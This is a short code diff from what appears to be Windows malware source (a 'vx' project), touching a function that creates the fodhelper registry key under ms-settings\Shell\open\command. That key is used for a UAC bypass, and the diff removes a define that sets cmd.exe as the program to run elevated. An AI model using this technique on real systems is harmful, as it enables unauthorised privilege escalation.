@@ -23,8 +23,7 @@
 #include "vxheader.h"
 #include "hiddencalls.h"
 
-#define KEYONE "Software\\Classes\\ms-settings\\Shell\\open\\command"
-#define PROGRAM "cmd.exe" // you can change it to whatever program you want to run escalated
+#define KEYONE "Software\\Classes\\ms-settings\\Shell\\open\\command" // DO NOT CHANGE
 
 BOOL vxCreateFodhelperKey(LPSTR path) {
 
